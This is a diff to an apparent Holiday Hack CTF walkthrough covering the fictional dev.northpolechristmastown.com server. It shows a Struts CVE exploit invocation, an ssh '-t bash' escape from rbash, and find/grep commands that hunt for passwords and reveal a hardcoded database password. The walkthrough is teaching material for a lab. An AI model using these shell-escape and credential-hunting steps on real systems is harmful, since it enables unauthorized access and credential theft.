@@ -284,13 +284,29 @@ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -
 
 *** Finding the password for alabaster_snowball 
 
+Login using ssh, but explicitly run bash, bypassing the rbash restriction
+
+#+BEGIN_SRC sh
+$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
+#+END_SRC
+
+First, fix the shells path.  We can grab what a normal path looks like from /etc/profile:
+
+#+BEGIN_SRC sh
+alabaster_snowball@l2s:~$ grep PATH /etc/profile
+  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
+export PATH
+alabaster_snowball@l2s:~$ PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+#+END_SRC
+
 Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
 Start small and double the filesize each time to keep the process fast.
 
 #+BEGIN_SRC sh
-alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -1k 2>/dev/null |xargs grep passwor
-alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -2k 2>/dev/null |xargs grep passwor
-alabaster_snowball@l2s:/tmp/asnow.Pl0FLAV4ubwwtLX5OjB1ZrCb$ find / -xdev -type f -user alabaster_snowball -size -4k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2>/dev/null |xargs grep passwor
+alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2>/dev/null |xargs grep passwor
 /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = "stream_unhappy_buy_loss";
 #+END_SRC
 
